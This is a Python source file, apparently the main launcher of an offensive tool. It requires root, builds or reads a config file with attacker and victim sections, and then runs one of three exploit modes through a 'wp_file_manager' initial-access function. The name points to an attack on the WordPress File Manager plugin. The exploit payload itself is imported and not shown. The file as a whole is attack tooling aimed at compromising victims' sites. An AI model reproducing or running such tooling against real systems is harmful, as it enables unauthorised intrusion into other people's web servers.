import create_conf
import os
import sys
import requests
import errno
import socket

from initial_access import wp_file_manager
from datetime import datetime
from configparser import ConfigParser 	

if os.geteuid() != 0:
		exit("[-] You need root privileges to run this script")	  	  
	
def main():

	flag = False

	config_object = ConfigParser()

	print('[+] Executing exploit...')
	print('[?] Do you wish to continue? (y|n)')
	ans = input()

	if not ans:
		sys.exit()

	if os.path.exists('./config.ini'):			  
		print('[+] Config file detected')
		print('[?] Do you wish to modify the configuration file? (y|n)')
		ans = input()
		if(ans == 'y' or ans == 'Y'):
			flag = True
	else:
		create_conf.gen_config(True)
		
	create_conf.gen_config(flag)
		
	while not os.path.exists('./config.ini'): # Wait while file is saved
		pass
	
	config_object.read("config.ini")
	attacker_info = config_object["ATTACKERINFO"]
	victim_info = config_object["VICTIMINFO"]
	general_info = config_object["GENERALINFO"]
	l = [1,2,3]
	if int(general_info['exploit']) in [1,2,3]:
		wp_file_manager(victim_info, attacker_info, general_info, general_info['exploit'])
	else:
		sys.exit("Something went wrong, invalid exploit")
	
if __name__ == '__main__':
	main()
